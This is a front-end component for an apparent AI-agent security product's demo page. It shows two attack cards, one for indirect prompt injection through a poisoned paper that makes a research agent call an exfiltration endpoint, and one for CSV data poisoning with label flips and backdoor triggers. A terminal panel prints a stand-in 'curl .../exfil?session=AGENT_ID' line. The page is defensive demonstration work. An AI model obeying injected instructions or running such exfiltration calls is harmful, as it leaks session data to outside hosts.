import "./AttacksDemo.css";

const ATTACKS = [
  {
    id: "a1",
    code: "A1",
    title: "Indirect Prompt Injection",
    badgeClass: "badge",
    cardClass: "attack-card--a1",
    target: "Research Agent · url_fetcher",
    steps: [
      { label: "Vector", text: "Malicious paper at /papers with _fetch_instructions payload" },
      { label: "Trigger", text: "Agent fetches poisoned content into context window" },
      { label: "Proof", text: "EXFIL CALLBACK RECEIVED — attack.type=exfil_callback in Dynatrace" },
    ],
    proof: "Dynatrace span: web_fetch + attack.detected=true",
  },
  {
    id: "a2",
    code: "A2",
    title: "Data Poisoning",
    badgeClass: "badge badge--magenta",
    cardClass: "attack-card--a2",
    target: "Feature Engineering Agent · CSV ingest",
    steps: [
      { label: "Vector", text: "poisoned.csv with label flips + backdoor trigger rows" },
      { label: "Trigger", text: "pandas_profile emits dataset.stats drift metrics" },
      { label: "Proof", text: "Sentinel HALT at model.train — dataset quarantined" },
    ],
    proof: "Label drift: 60/40 → 67/33 alert/drowsy",
  },
];

export function AttacksDemo() {
  return (
    <section class="section" id="attacks">
      <div class="container">
        <p class="section__label">Live Demo Scenarios</p>
        <h2 class="section__title">Attacks Demo</h2>
        <p class="section__lead">
          Two realistic agent threats — one behavioral, one data-shaped — both caught by
          the same Emit → Detect → Decide → Enforce loop.
        </p>

        <div class="attacks__layout">
          <div class="attacks__grid">
            {ATTACKS.map((attack) => (
              <article
                key={attack.id}
                class={`card cyber-chamfer attack-card ${attack.cardClass}`}
              >
                <div class="attack-card__header">
                  <h3 class="attack-card__title">{attack.title}</h3>
                  <span class={attack.badgeClass}>{attack.code}</span>
                </div>
                <p class="attack-card__target">Target: {attack.target}</p>
                <ul class="attack-card__list">
                  {attack.steps.map((step) => (
                    <li key={step.label}>
                      <strong>{step.label}:</strong> {step.text}
                    </li>
                  ))}
                </ul>
                <p class="attack-card__proof">{attack.proof}</p>
              </article>
            ))}
          </div>

          <div class="card card--terminal cyber-chamfer attacks__terminal">
            <p class="terminal-line terminal-line--accent">
              $ curl https://attack-server.run.app/exfil?session=AGENT_ID
            </p>
            <p class="terminal-line">
              EXFIL CALLBACK RECEIVED — params=&#123;"session": "AGENT_ID"&#125;
            </p>
            <p class="terminal-line terminal-line--warn">
              sentinel.verdict = HALT — egress.host anomalous
            </p>
          </div>
        </div>
      </div>
    </section>
  );
}
